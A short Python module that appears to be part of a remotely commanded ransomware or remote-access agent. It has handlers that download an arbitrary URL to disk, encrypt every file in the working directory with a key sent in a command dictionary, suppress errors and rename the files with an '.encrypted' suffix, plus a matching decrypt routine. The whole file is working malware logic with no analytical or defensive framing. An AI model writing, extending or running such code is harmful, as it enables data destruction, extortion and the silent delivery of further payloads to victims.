import os
import requests
from pathlib import Path
from cryptography.fernet import Fernet


def download(args:str) -> None:
	command, download_url, output_file = args.split()
	new_data = requests.get(download_url)
	with open(output_file, 'wb') as f:
		f.write(new_data.content)


def encrypt(command_dict:dict) -> None:
	# convert sent key to bytes
	key = command_dict["encryption_key"].encode()
	# create fernet key object from key bytestring
	fernet = Fernet(key)

	if not command_dict["files"]:
		command_dict["files"] = directory_files()

	for file in command_dict["files"]:
		try:
			# opening the original file to encrypt
			with open(file, 'rb') as f:
				original = f.read()
			# encrypting the file
			encrypted = fernet.encrypt(original)
			# opening the file in write mode and
			# writing the encrypted data
			with open(file, 'wb') as encrypted_file:
				encrypted_file.write(encrypted)
			os.rename(file, f"{file}.encrypted")
		except:
			pass
	return "Encryption Complete"


def decrypt(command_dict:dict) -> None:
	# convert sent key to bytes
	key = command_dict["decryption_key"].encode()
	# create fernet key object from key bytestring
	fernet = Fernet(key)

	if not command_dict["files"]:
		command_dict["files"] = directory_files()

	for file in command_dict["files"]:
		try:
			# opening the encrypted file
			with open(file, 'rb') as f:
				encrypted = f.read()
			# decrypting the file
			decrypted = fernet.decrypt(encrypted)
			# opening the file in write mode and
			# writing the decrypted data
			with open(file, 'wb') as f:
				f.write(decrypted)
			os.rename(file, file.replace(".encrypted", "", 1))
		except:
			pass
	return "Decryption Complete"


def directory_files() -> list:
	files = Path().iterdir()
	return [file.name for file in files if file.is_file()]